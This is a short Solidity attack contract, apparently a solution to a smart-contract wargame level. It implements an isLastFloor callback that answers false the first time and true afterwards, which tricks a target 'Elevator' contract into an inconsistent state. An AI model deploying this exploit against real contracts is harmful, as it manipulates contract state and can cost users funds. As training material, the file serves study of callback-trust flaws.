// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttack {
    address public target;
    bool public locked;

    constructor(address _target) {
        target = _target;
    }

    function isLastFloor(uint) public returns (bool) {
        if (locked) {
            return true;
        } else {
            locked = true;
            return false;
        }
    }
    function attack() public {
        IElevator(target).goTo(1);
    }
}